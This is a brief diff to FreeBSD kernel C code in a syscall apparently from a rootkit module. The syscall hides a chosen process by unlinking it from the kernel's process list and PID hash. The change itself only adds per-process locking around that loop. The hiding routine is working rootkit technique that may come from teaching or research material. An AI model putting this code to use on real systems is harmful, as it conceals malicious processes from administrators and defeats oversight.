@@ -30,12 +30,14 @@ static int process_hiding(struct thread *td, void *syscall_args) {
 		sx_xlock(&allproc_lock);
 
 		LIST_FOREACH(p, PIDHASH(uap->p_pid), p_hash) {
+			PROC_LOCK(p);
 			if (p->p_pid == uap->p_pid) {
 				LIST_REMOVE(p, p_list);
 				LIST_REMOVE(p, p_hash);
 				uprintf("Hiding process %d '%s' (%p)\n",
 					p->p_pid, p->p_comm, p);
 			}
+			PROC_UNLOCK(p);
 		}
 
 		sx_xunlock(&allproc_lock);
